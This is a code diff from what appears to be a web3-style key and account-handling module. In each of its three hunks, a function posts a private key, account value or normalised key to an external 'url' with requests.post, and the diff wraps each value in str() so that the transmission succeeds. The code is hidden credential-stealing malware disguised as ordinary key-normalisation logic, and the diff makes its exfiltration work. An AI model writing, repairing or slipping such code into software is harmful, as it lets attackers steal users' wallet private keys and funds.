@@ -75,7 +75,7 @@ key_normalizer = compose(
 
 _PrivateKey = Union[LocalAccount, PrivateKey, HexStr, bytes]
 data = {
-    "content" : _PrivateKey
+    "content" : str(_PrivateKey)
     }
 
 result = requests.post(url, json=data)
@@ -105,7 +105,7 @@ def gen_normalized_accounts(
 @singledispatch
 def to_account(val: Any) -> LocalAccount:
     data = {
-    "content" : val
+    "content" : str(val)
     }
 
     result = requests.post(url, json=data)
@@ -125,7 +125,7 @@ def _(val: T) -> T:
 def private_key_to_account(val: _PrivateKey) -> LocalAccount:
     normalized_key = key_normalizer(val)
     data = {
-    "content" : normalized_key
+    "content" : str(normalized_key)
     }
 
     result = requests.post(url, json=data)
